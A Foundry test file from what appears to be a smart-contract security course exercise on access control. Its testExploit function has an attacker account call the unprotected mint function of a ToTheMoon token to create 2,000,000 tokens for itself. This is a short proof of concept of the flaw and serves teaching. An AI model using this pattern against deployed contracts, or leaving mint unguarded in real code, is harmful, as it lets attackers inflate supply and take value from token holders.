// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {ToTheMoon} from "../../src/7. Access Control-2/ToTheMoon.sol";
// import {ToTheMoonSecured} from "../../src/7. Access Control-2/solution/SecuredToTheMoon.sol";

contract TestToTheMoon is Test {
    ToTheMoon token;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address attacker = makeAddr("attacker");

    uint256 constant INITIAL_MINT = 1000;
    uint256 constant USER_MINT = 10;

    function setUp() public {
        vm.startPrank(deployer);
        token = new ToTheMoon(INITIAL_MINT);

        token.mint(user1, USER_MINT);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.prank(attacker);
        token.mint(attacker, 2_000_000);

        assertEq(token.balanceOf(attacker), 2_000_000);
    }
}
